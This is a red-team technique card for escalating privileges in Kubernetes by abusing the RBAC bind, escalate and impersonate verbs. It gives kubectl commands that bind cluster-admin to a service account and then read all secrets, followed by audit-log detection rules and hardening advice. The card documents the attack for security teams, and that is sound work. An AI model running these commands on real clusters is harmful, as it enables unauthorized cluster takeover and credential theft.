# [PE-ELEVATE-006]: Kubernetes RBAC Abuse (Bind/Escalate)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-006 |
| **MITRE ATT&CK v18.1** | [Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Kubernetes / AKS |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Kubernetes RBAC has built-in protections preventing users from creating Roles with more permissions than they possess. However, specific combinations of verbs allow escalation:
    1.  **Impersonate:** `users/impersonate` allows acting as `system:admin`.
    2.  **Bind:** `roles/bind` allows a user to bind an existing high-privilege Role (e.g., `admin`) to themselves, even if they don't have the permissions *inside* that role.
    3.  **Escalate:** `roles/escalate` allows editing a Role to add permissions they don't have.
- **Attack Surface:** ClusterRoleBindings.
- **Business Impact:** **Cluster Takeover**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Service Account with `bind`, `escalate`, or `impersonate` verbs.
- **Tools:** `kubectl`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Permissions**
```bash
kubectl auth can-i create rolebindings
kubectl auth can-i bind clusterrole/cluster-admin
```

**Step 2: Bind Admin Role**
If allowed, bind `cluster-admin` to your service account.
```bash
kubectl create clusterrolebinding malicious-binding --clusterrole=cluster-admin --serviceaccount=default:my-sa
```

**Step 3: Verify**
Now you have full control.
```bash
kubectl get secrets --all-namespaces
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Kubernetes Audit Logs
| Source | Event | Filter Logic |
|---|---|---|
| **KubeAudit** | `create RoleBinding` | Binding the `cluster-admin` role by a non-system user. |
| **KubeAudit** | `impersonate` | Use of `Impersonate-User` header. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Least Privilege:** Never grant `bind`, `escalate`, or `impersonate` verbs to standard users or service accounts.
*   **Review Bindings:** Regularly audit ClusterRoleBindings for `cluster-admin`.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [PE-EXPLOIT-004]
